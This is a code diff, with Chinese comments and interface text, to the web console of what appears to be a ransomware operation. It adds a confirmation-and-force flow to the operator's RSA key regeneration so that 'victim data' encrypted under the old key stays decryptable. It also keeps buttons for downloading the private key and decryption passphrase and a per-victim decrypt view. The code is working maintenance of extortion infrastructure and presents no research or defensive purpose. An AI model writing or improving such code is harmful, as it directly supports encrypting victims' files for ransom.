@@ -310,10 +310,23 @@ function showDecrypt(vid,ip,isLinux){
   }
   nr.appendChild(td);tr.after(nr);_decOpen=nr;
 }
-function genKey(){
+function genKey(force){
   var r=document.getElementById('key-result');
   r.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> 正在生成RSA-2048密钥对...</span>';
-  fetch('/keygen',{method:'POST',body:new URLSearchParams({csrf_token:'{{ csrf_token() }}'})}).then(x=>x.json()).then(d=>{
+  var _fd=new URLSearchParams({csrf_token:'{{ csrf_token() }}'});
+  if(force)_fd.append('force','1');
+  fetch('/keygen',{method:'POST',body:_fd}).then(x=>x.json()).then(d=>{
+    // 服务端发现已有密钥：先让操作员明确确认再带 force 重试。
+    // 此前 Python 侧 keygen 既没有确认也没有归档，一次点击就把历史密钥覆盖掉，
+    // 此前所有受害者数据永久不可解；前端 confirm 也挡不住直接调 API。
+    if(d.need_confirm){
+      if(confirm('⚠️ 危险操作\n\n已有密钥对'+(d.key_id?' (ID: '+d.key_id+')':'')+'。\n\n重新生成后，此前所有已加密的受害者数据将【永久无法解密】。\n旧密钥会被归档为 .bak 文件，但受害者文件仍需旧私钥才能恢复。\n\n确定要重新生成吗？')){
+        genKey(true);
+      }else{
+        r.innerHTML='<div class="gen-err"><i class="fas fa-ban"></i> 已取消，密钥未变动</div>';
+      }
+      return;
+    }
     if(d.ok){r.innerHTML='<div class="gen-ok"><i class="fas fa-key"></i> '+d.msg+'<br><br><b>公钥:</b><pre class="dt-code" style="margin-top:8px;max-height:120px;overflow:auto;font-size:.72rem">'+d.pub+'</pre><div style="margin-top:8px"><a href="/download_key?file=jasmin_private.pem" class="btn btn-red" style="display:inline-flex"><i class="fas fa-download"></i> 下载私钥</a> <a href="/download_key?file=jasmin_private.pem.enc" class="btn btn-red" style="display:inline-flex;background:#f59e0b"><i class="fas fa-lock"></i> 下载加密私钥</a> <a href="/download_key?file=.key_secret" class="btn btn-red" style="display:inline-flex;background:#8b5cf6"><i class="fas fa-unlock-alt"></i> 下载解密口令</a> <a href="/download_key?file=jasmin_public.pem" class="btn btn-red" style="display:inline-flex;background:#4dc3fa"><i class="fas fa-download"></i> 下载公钥</a> <span style="font-size:.76rem;color:#94a3b8;margin-left:10px">刷新页面可见顶部「密钥管理」</span></div></div>';}
     else{r.innerHTML='<div class="gen-err">'+d.msg+'</div>';}
   }).catch(e=>{r.innerHTML='<div class="gen-err">'+e+'</div>';});
